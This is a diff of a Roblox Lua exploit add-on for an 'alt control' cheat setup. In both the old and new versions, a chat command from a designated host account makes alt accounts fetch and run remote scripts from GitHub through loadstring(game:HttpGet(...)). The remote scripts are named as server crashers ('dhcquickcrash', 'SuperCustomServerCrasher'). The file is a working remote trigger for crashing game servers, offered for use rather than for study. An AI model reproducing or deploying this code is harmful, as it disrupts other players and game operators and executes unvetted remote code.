@@ -1,23 +1,24 @@
---[[
-    !!! THIS IS NOT AN ALTCONTROL ITS JUST AN ADDON FOR IKU ALTCONTROL !!!
-    Execute this after iku loadstring
-]]
+-- chiiicken#3436
 
 
-if not game:IsLoaded() then game.Loaded:Wait() end
-repeat wait() until workspace.Players:FindFirstChild(game.Players.LocalPlayer.Name)
+repeat task.wait() until game:IsLoaded()
 
-local function playerfromuserid(userId)
-    for _, player in pairs(Players:GetPlayers()) do
-        if player.UserId == userId then
-            return player
-        end
-    end
+if game.Players.LocalPlayer.UserId == getgenv().Settings.host then return end
+
+for _, player in pairs(game:GetService("Players"):GetPlayers()) do
+	
+	if player.UserId == getgenv().Settings.host then
+		player.Chatted:Connect(function(message)
+			if message:match(getgenv().Settings.prefix .. "encrypt") then
+				if game.Players.LocalPlayer.UserId == getgenv().Alts.Alt1 then
+					print("this is alt1")
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dhcquickcrash.lua"))()
+				else
+					-- TODO: Remove else catch (This is to test if everything works fine)
+					print("not alt1")
+				end
+			end
+		end)
+	end
+	
 end
-
-playerfromuserid(getgenv().Settings.host).Chatted:Connect(function(msg)
-    if msg:match(getgenv().Settings.prefix.."tooldupe") then
-        -- automatic crash start is almost done - I will update this soon
-        loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
-    end
-end)
